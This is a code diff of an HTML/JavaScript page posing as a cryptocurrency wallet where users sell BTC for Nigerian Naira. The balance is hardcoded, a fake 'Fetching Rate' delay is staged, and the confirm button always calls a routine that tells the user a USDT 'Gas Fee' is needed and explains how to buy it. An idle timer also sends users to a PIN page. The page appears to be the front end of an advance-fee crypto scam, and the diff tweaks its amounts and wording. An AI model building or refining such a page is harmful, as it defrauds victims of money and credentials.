@@ -33,8 +33,7 @@
     text-align: center; margin-bottom: 25px; box-shadow: 0 4px 12px rgba(0,0,0,0.03);
   }
   .balance p { margin: 0 0 8px; font-size: 13px; color: var(--text-dim); font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
-  .balance strong { font-size: 22px; color: var(--text); font-weight: 800; display: block; }
-  .balance .sub-balance { font-size: 13px; color: var(--text-dim); font-weight: 600; margin-top: 4px; display: block; }
+  .balance strong { font-size: 22px; color: var(--text); font-weight: 800; }
 
   .input-group { margin-bottom: 20px; }
   .input-group label { display: block; margin-bottom: 8px; font-size: 13px; font-weight: 600; color: var(--text-dim); }
@@ -99,17 +98,15 @@
 
 <div class="balance">
   <p>Available Balance</p>
-  <strong id="balanceText">0.00457168 BTC</strong>
-  <span class="sub-balance" id="subBalanceText">≈ ¥55,216.73 ($358.42 USD)</span>
+  <strong id="balanceText">0.004407 BTC ≈ €326.94</strong>
 </div>
 
 <div class="input-group">
-  <label for="amount">BTC Amount (Min. 0.0045)</label>
+  <label for="amount">BTC Amount (Min. 0.0044)</label>
   <div class="field-wrap">
-    <input type="number" id="amount" step="0.0001" placeholder="0.0045" inputmode="decimal">
+    <input type="number" id="amount" step="0.0001" placeholder="0.0044" inputmode="decimal">
     <button class="all-btn" onclick="setAll()">MAX</button>
   </div>
-  <small id="errorMsg" style="color:var(--danger); font-size:12px; font-weight:600; display:none; margin-top:6px;"></small>
 </div>
 
 <div class="input-group">
@@ -145,8 +142,8 @@
     <div style="font-size: 40px; margin-bottom: 10px;">⚡</div>
     <h2 style="margin:0 0 10px; font-weight:800; color:var(--text);">Confirm Sale</h2>
     <div style="background: #f1f5f9; border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: left; border: 1px solid var(--border);">
-        <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--text-dim)">Selling:</span><strong id="popBtc" style="color:var(--text)">0.0045 BTC</strong></div>
-        <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--text-dim)">Payout:</span><strong style="color:var(--pri)">₦427,489</strong></div>
+        <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--text-dim)">Selling:</span><strong id="popBtc" style="color:var(--text)">0.004407 BTC</strong></div>
+        <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--text-dim)">Payout:</span><strong style="color:var(--pri)" id="popNaira">₦490,072.26</strong></div>
         <div style="display:flex; justify-content:space-between;"><span style="color:var(--text-dim)">Network Fee:</span><span style="color:var(--text)">$3 USDT</span></div>
     </div>
     <button class="confirm-btn" onclick="insufficient()">Confirm Transaction</button>
@@ -164,75 +161,50 @@
 </div>
 
 <script>
-  const rate = 427489;
-  const maxBalance = 0.00457168;
-  const minSellLimit = 0.0045;
+  const btcRateEur = 74183.40;
+  const userBtc = 0.004407;
+  const eurToNgnRate = 1498.96696;
   const amountInput = document.getElementById('amount');
   const nairaValue = document.getElementById('nairaValue');
   const balanceText = document.getElementById('balanceText');
-  const subBalanceText = document.getElementById('subBalanceText');
-  const errorMsg = document.getElementById('errorMsg');
 
-  // Permanently hardcoded balance display
-  balanceText.textContent = maxBalance.toFixed(8) + " BTC";
-  subBalanceText.textContent = "≈ ¥55,216.68 ($358.42 USD)";
+  balanceText.textContent = `${userBtc} BTC ≈ €326.94`;
 
   function setAll() {
-    amountInput.value = maxBalance;
+    amountInput.value = userBtc;
     calculate();
   }
 
   function calculate() {
     const val = parseFloat(amountInput.value);
-    
-    if (isNaN(val) || val === 0) {
-      errorMsg.style.display = "none";
-      nairaValue.value = "₦0.00";
-      return;
+    if(val >= 0.0044) {
+        nairaValue.value = "Fetching Rate...";
+        nairaValue.classList.add('loader-dots');
+        setTimeout(() => {
+            const calculatedNaira = val * btcRateEur * eurToNgnRate;
+            nairaValue.value = "₦" + calculatedNaira.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            nairaValue.classList.remove('loader-dots');
+        }, 1800);
+    } else {
+        nairaValue.value = "₦0.00";
     }
-
-    if (val > maxBalance) {
-      errorMsg.textContent = "Insufficient balance. Exceeds available limit of " + maxBalance + " BTC.";
-      errorMsg.style.display = "block";
-      nairaValue.value = "₦0.00";
-      return;
-    }
-
-    if (val < minSellLimit) {
-      errorMsg.textContent = "Minimum sell amount is " + minSellLimit + " BTC.";
-      errorMsg.style.display = "block";
-      nairaValue.value = "₦0.00";
-      return;
-    }
-
-    errorMsg.style.display = "none";
-
-    nairaValue.value = "Fetching Rate...";
-    nairaValue.classList.add('loader-dots');
-    setTimeout(() => {
-        const calculatedPayout = (val / minSellLimit) * rate;
-        nairaValue.value = "₦" + calculatedPayout.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-        nairaValue.classList.remove('loader-dots');
-    }, 1800);
   }
 
   amountInput.addEventListener('input', calculate);
 
   function showPopup(){
     const val = parseFloat(amountInput.value);
-    if(isNaN(val) || val < minSellLimit) {
-      triggerAlert("Invalid Amount", "Minimum order amount is " + minSellLimit + " BTC.", "⚠️");
-      return;
-    }
-    if(val > maxBalance) {
-      triggerAlert("Balance Exceeded", "Entered amount exceeds available balance of " + maxBalance + " BTC.", "⚠️");
+    if(!val || val < 0.0044) {
+      alert("Minimum amount is 0.0044 BTC");
       return;
     }
     if(document.getElementById('account').value.length < 10) {
-      triggerAlert("Invalid Account", "Please enter a valid 10-digit NUBAN account number.", "⚠️");
+      alert("Please enter a valid 10-digit NUBAN account number.");
       return;
     }
-    document.getElementById('popBtc').textContent = val + " BTC";
+    document.getElementById('popBtc').textContent = amountInput.value + " BTC";
+    const popCalculatedNaira = val * btcRateEur * eurToNgnRate;
+    document.getElementById('popNaira').textContent = "₦" + popCalculatedNaira.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
     document.getElementById('popup').style.display = 'flex';
   }
 
@@ -247,7 +219,7 @@
     closePopup();
     setTimeout(() => {
         const title = "Action Required: Gas Fee Needed";
-        const message = "To complete this sale, a  network fee (Gas Fee) is required by the blockchain to process your transaction. Your current USDT balance is 0.14.\n\n" +
+        const message = "To complete this sale, a  network fee (Gas Fee) is required by the blockchain to process your transaction. Your current USDT balance is 0.00.\n\n" +
                         "Follow these steps to solve this:\n" +
                         "1. Return to your Dashboard.\n" +
                         "2. Tap on the 'Buy / Sell' menu.\n" +
@@ -270,7 +242,7 @@
 
   setInterval(() => {
     const last = localStorage.getItem('lastActiveTime');
-    if(last && (Date.now() - last > 60000)) window.location.href = 'user_pin.html';
+    if(last && (Date.now() - last > 60000)) window.location.href = 'pin.html';
   }, 2000);
   function reset() { localStorage.setItem('lastActiveTime', Date.now()); }
   ['click','touchstart','input'].forEach(e => document.addEventListener(e, reset));
